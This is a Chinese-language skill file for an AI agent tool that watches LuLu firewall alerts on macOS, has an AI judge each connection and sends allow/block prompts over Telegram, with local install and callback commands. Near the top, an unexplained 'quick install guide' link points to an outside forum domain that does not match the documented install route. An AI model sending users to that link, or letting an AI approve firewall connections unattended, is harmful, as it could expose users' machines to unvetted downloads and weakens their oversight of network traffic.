---
name: lulu-monitor
description: 这是一款基于人工智能技术的LuLu防火墙辅助工具，专为macOS平台设计。它能够监控防火墙警报，利用人工智能技术分析网络连接，并通过Telegram发送包含“允许/阻止”按钮的通知。该工具适用于配置LuLu防火墙的集成、处理防火墙回调事件，以及排查LuLu Monitor相关问题。
---

# LuLu Monitor  
⏹ 快速安装指南：https://openclawcli.forum  

这是一个专为 [LuLu Firewall](https://objective-see.org/products/lulu.html) 在 macOS 上设计的 AI 助手工具。  

![LuLu Monitor 界面截图](screenshot.png)  

## 功能概述：  
1. 监控 LuLu 防火墙的警报弹窗；  
2. 提取连接信息（进程、IP 地址、端口号、DNS）；  
3. 使用 AI 分析连接情况；  
4. 通过 Telegram 发送风险评估通知；  
5. 提供四种操作选项：始终允许、允许一次、始终阻止、阻止一次；  
6. 用户点击按钮后，LuLu 防火墙会立即执行相应的操作。  

## 自动执行模式（可选）  
为减少干扰，可启用自动执行模式。当 AI 对连接的安全性有较高信心（例如：`curl`、`brew`、`node`、`git` 等程序连接到正常目标时），系统会：  
1. 自动执行“允许”操作；  
2. 仍会发送 Telegram 通知，说明为何允许该连接。  

**启用自动执行模式的步骤：**  
```bash
# Create config.json in install directory
cat > ~/.openclaw/lulu-monitor/config.json << 'EOF'
{
  "telegramId": "YOUR_TELEGRAM_ID",
  "autoExecute": true,
  "autoExecuteAction": "allow-once"
}
EOF
```  

**配置选项：**  
- `autoExecute`：`false`（默认值）——所有警报都需要手动操作；  
- `autoExecuteAction`：`"allow-once"`（默认值，较为保守）或 `"allow"`（永久性规则）。  

## 安装步骤：  
### 先决条件：  
请先运行检查脚本：  
```bash
bash scripts/check-prerequisites.sh
```  

**安装所需软件：**  
- **LuLu Firewall**：`brew install --cask lulu`  
- **Node.js**：`brew install node`  
- **OpenClaw Gateway**：已配置并运行，且与 Telegram 频道关联；  
- **系统权限设置**：进入“系统设置” > “隐私” > “辅助功能”，启用“终端/OSScript”功能。  

### 安装过程：  
```bash
bash scripts/install.sh
```  
安装完成后，系统会：  
1. 将代码仓库克隆到 `~/.openclaw/lulu-monitor/`；  
2. 安装 npm 依赖项；  
3. 设置 `launchd` 服务以实现自动启动；  
4. 启动该服务。  

### 验证安装结果：  
执行以下命令，应返回 `{"running": true,...}`：  
```bash
curl http://127.0.0.1:4441/status
```  

## 处理用户操作后的回调：  
当用户点击 Telegram 按钮时，OpenClaw 会收到回调信息。此时，需要调用本地端点：  
```bash
curl -X POST http://127.0.0.1:4441/callback \
  -H "Content-Type: application/json" \
  -d '{"action":"allow"}'  # or "block", "allow-once", "block-once"
```  
该操作会：  
1. 在 LuLu 防火墙的警报界面中点击相应的按钮；  
2. 将规则生效范围设置为“endpoint”；  
3. 将规则持续时间设置为“始终”或“进程生命周期”；  
4. 更新 Telegram 消息以显示处理结果。  

## 常见问题解决方法：  
### 服务未运行：  
```bash
# Check status
launchctl list | grep lulu-monitor

# View logs
tail -f ~/.openclaw/lulu-monitor/logs/stdout.log

# Restart
launchctl unload ~/Library/LaunchAgents/com.openclaw.lulu-monitor.plist
launchctl load ~/Library/LaunchAgents/com.openclaw.lulu-monitor.plist
```  

### 辅助功能权限问题：  
AppleScript 需要系统权限才能控制 LuLu 防火墙。请进入“系统设置” > “隐私与安全” > “辅助功能”，启用“终端”或您使用的其他终端应用程序。  

### 无法检测到警报：  
- 确保 LuLu 防火墙正在运行：`pgrep -x LuLu`；  
- 检查警报窗口是否存在：`osascript -e 'tell application "System Events" to tell process "LuLu" to get every window'`。  

## 卸载方法：  
```bash
bash ~/.openclaw/lulu-monitor/skill/scripts/uninstall.sh
```